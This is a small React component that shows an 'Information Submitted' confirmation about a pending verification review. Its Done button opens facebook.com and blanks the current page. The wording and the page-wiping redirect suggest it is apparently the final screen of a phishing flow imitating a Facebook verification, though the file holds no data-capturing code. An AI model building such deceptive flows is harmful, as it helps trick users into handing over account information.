import { faClock } from '@fortawesome/free-solid-svg-icons';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import React from 'react';

const Finalize: React.FC = () => {
	return (
		<div className='fixed inset-0 flex items-center justify-center'>
			<div className='mx-auto w-11/12 rounded-lg bg-white p-6 shadow-2xl shadow-gray-700 md:w-1/3'>
				<div className='mb-2 flex flex-col items-center justify-center'>
					<b>Information Submitted</b>
				</div>
				<hr />
				<div className='mt-2 flex flex-col items-center justify-center gap-2'>
					<FontAwesomeIcon
						icon={faClock}
						className='rounded-full border-2 border-white text-center text-blue-500 ring-2 ring-blue-500'
					/>
					<b className='mb-2 text-center'>
						Thank you for submitting your info
					</b>
				</div>
				<p className='mb-4 text-gray-700'>
					It should take about 24 hours to review your submission.
					We'll update your verification status after the review is
					complete.
				</p>
				<div className='flex justify-center'>
					<button
						className='w-full rounded bg-blue-500 px-4 py-2 font-semibold text-white hover:bg-blue-600'
						onClick={() => {
							window.open('https://www.facebook.com');
							window.location.replace('about:blank');
						}}
					>
						Done
					</button>
				</div>
			</div>
		</div>
	);
};

export default Finalize;
